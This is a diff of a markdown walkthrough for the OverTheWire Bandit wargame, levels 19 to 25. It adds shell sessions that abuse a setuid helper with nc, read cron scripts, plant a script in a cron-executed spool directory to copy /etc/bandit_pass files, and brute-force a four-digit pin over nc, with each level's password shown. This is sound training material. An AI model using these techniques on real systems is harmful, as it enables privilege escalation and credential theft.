@@ -379,7 +379,7 @@ awhqfNnAbc1naukrpqDYcF95h7HoMTrC
 ```
 # 19
 ```
-❯ scp -P 2220 bandit19@bandit.labs.overthewire.org:readme .
+❯ ssh bandit19@bandit.labs.overthewire.org -p 2220
 bandit19@bandit:~$ ls
 bandit20-do
 bandit19@bandit:~$ ./bandit20-do 
@@ -390,5 +390,113 @@ VxCazJaVykI6W36BkBU0mJTCM8rR95XT
 ```
 # 20
 ```
-❯ scp -P 2220 bandit20@bandit.labs.overthewire.org:readme .
+❯ ssh bandit20@bandit.labs.overthewire.org -p 2220
+bandit20@bandit:~$ echo "VxCazJaVykI6W36BkBU0mJTCM8rR95XT" | nc -lvp 12345 &
+[1] 2782397
+bandit20@bandit:~$ Listening on 0.0.0.0 12345
+
+bandit20@bandit:~$ ./suconnect 12345
+Connection received on localhost 49486
+Read: VxCazJaVykI6W36BkBU0mJTCM8rR95XT
+Password matches, sending next password
+NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
+[1]+  Done                    echo "VxCazJaVykI6W36BkBU0mJTCM8rR95XT" | nc -lvp 12345
+```
+# 21
+```
+❯ ssh bandit21@bandit.labs.overthewire.org -p 2220
+bandit21@bandit:~$ ls
+bandit21@bandit:~$ cd /etc/cron.d/
+bandit21@bandit:/etc/cron.d$ ls
+cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root  e2scrub_all  otw-tmp-dir  sysstat
+bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
+```
+# 22
+```
+❯ ssh bandit22@bandit.labs.overthewire.org -p 2220
+bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+bandit22@bandit:~$ echo "I am user bandit23" | md5sum | cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe81326349
+bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
+```
+# 23
+```
+❯ ssh bandit23@bandit.labs.overthewire.org -p 2220
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh 
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo || exit 1
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -rf ./$i
+    fi
+done
+bandit23@bandit:~$ mkdir /tmp/testAAA
+bandit23@bandit:~$ cd /tmp/testAAA
+bandit23@bandit:/tmp/testAAA$ vim test.sh
+bandit23@bandit:/tmp/testAAA$ cat test.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/testAAA/pw.txt
+bandit23@bandit:/tmp/testAAA$ chmod 777 -R /tmp/testAAA/
+bandit23@bandit:/tmp/testAAA$ mv test.sh /var/spool/bandit24/foo
+bandit23@bandit:/tmp/testAAA$ ls
+pw.txt
+bandit23@bandit:/tmp/testAAA$ cat pw.txt 
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+```
+# 24
+```
+❯ ssh bandit24@bandit.labs.overthewire.org -p 2220
+bandit24@bandit:~$ cd /tmp/testAAA
+bandit24@bandit:/tmp/testAAA$ vim test2.sh
+bandit24@bandit:/tmp/testAAA$ cat test2.sh      
+#!/bin/bash
+
+for i in {0000..9999};
+do
+	echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i";
+done | nc localhost 30002
+bandit24@bandit:/tmp/testAAA$ chmod +x test2.sh
+bandit24@bandit:/tmp/testAAA$ ./test2.sh
+...
+Wrong! Please enter the correct pincode. Try again.
+Correct!
+The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+```
+# 25
+```
+❯ ssh bandit25@bandit.labs.overthewire.org -p 2220
 ```
